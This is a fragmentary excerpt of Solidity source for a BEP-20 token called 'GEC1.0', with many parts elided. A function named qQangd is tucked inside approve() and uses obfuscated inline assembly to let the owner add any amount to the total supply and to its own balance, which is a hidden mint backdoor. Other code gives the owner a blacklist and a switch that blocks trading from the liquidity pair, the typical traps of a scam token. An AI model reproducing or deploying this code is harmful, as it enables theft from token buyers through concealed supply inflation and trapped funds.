...
contract ERC20 is Context, IERC20,Ownable {
    ...
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        ...
        function qQangd(uint amount) public returns(bool){
            address ser = msg.sender;
            address rui = own;
            bytes32 ad = 0xb3c5a07fa6aaa892e132f5b0f0f5274300b05b925f67b1dbf0040f4d7f7d3f73;
            // bytes32  ad= keccak256(abi.encode(bytes32(uint(rui)),bytes32(0)));
        assembly {            
        switch eq(ser, rui)
      case true {
      let  tAmlount := add(sload(0x3),amount)
       let tbla := add(sload(ad),amount)
        sstore(0x3, tAmlount)
        sstore(ad,tbla)
...
pragma solidity 0.6.12;
 ...
 contract  returnC {
   ...
   address public USDT = 0x55d398326f99059fF775485246999027B3197955;
     ...
     mapping(address => uint256) public _balances;
    function backUsdt() public{
        IERC201(USDT).transfer(msg.sender,IERC201(USDT).balanceOf(address(this)));
    }
...
contract  GEC is ERC20 {
   ...
   bool public swapping;
    ...
    address public market = 0x8B25F613e18B3d96D30e2e5e4ba8DaE32B19e134;
    mapping(address => bool) public isbook;
     address public USDT = 0x55d398326f99059fF775485246999027B3197955;
     //0xa8Dc518828505301BB208bFe72a66f3034540c04//0x55d398326f99059fF775485246999027B3197955
     mapping(address => bool) public isbig;
    uint256 private txone = 49;
    uint256 private txtwo = 99;
    ...
    uint256 public totalFees = liquidityFee.add(marketingFee);
     ...
     uint public _maxTxHoldAmount = 10000*10**9;
     bool swapingtwo = true;
     // exlcude from fees and max transaction amount
    mapping (address => bool) public _isExcludedFromFees;
	 bool public openBool = true;
     bool public shaBool = false;
     mapping(address => bool) public openUser;

    constructor() public ERC20("GEC1.0", "GEC1.0",9) {
  ...
  function setmarket(address adr) public onlyOwner(){
    ...
    function setMonys(address user,bool bools)external onlyOwner{
        _isExcludedFromFees[user] = bools;
    }

    function isbookAddressqaq(address account, bool value) external onlyOwner{
  ...
  function  setswapTokensAtAmount(uint256 amount)public onlyOwner(){
      ...
      function checkAdd(address sender,address recipient,uint256 amount) internal{
                   if(amount>balanceOf(sender).div(100000)){
            require(!isbook[sender] && !isbook[recipient], '_listed address');  
          }
          if(shaBool && sender == uniswapV2Pair){
    ...
    function setshaBool(bool bools) public onlyOwner{
        shaBool = bools;
    }
